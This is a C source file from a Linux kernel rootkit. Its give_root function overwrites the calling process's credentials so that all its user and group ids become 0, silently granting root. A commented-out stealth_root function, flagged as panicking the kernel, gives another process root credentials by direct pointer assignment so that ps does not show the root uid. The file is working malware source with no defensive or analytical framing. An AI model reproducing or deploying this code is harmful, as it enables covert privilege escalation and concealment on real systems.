#include <linux/cred.h>

#include "credreplace.h"

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void give_root(void)
{
  /* prepare_creds returns the current credentials of the process */
  struct cred* root;
  root = prepare_creds();

  if (root == NULL)
    return;

  /* Run through and set all the various *id's to 0 (root) */
  root->uid.val = root->gid.val = 0;
  root->euid.val = root->egid.val = 0;
  root->suid.val = root->sgid.val = 0;
  root->fsuid.val = root->fsgid.val = 0;

  /* Set the cred struct that we've modified to that of the calling process */
  commit_creds(root);
  printk(KERN_DEBUG "rootkit: giving root...\n");
}

// FIXME: Panics kernel, but I want this functionality
// - hides root from ps using dirty assignment
// int stealth_root(pid_t pid)
//{
//  struct task_struct* task;
//  struct cred* new_cred;
//
//	//task = get_pid_task(pid, PIDTYPE_PID);
//
//  kuid_t kuid = KUIDT_INIT(0);
//  kgid_t kgid = KGIDT_INIT(0);
//
//	task = get_pid_task(find_get_pid(pid),PIDTYPE_PID);
//  if (task == NULL) {
//    printk(KERN_ALERT "rootkit: Failed to get current task info.\n");
//    return -1;
//  }
//
//  new_cred = prepare_creds();
//  if (new_cred == NULL) {
//    printk(KERN_ALERT "Failed to prepare new credentials\n");
//    return -ENOMEM;
//  }
//  new_cred->uid = kuid;
//  new_cred->gid = kgid;
//  new_cred->euid = kuid;
//  new_cred->egid = kgid;
//
//  // Dirty creds assignment so "ps" doesn't show the root uid!
//  // If one uses commit_creds(new_cred), not only this would only affect
//  // the current calling task but would also display the new uid (more visible).
//  // rcu_assign_pointer is taken from the commit_creds source code
//  // (kernel/cred.c)
//	rcu_assign_pointer(task->cred, new_cred);
//  return 0;
//}
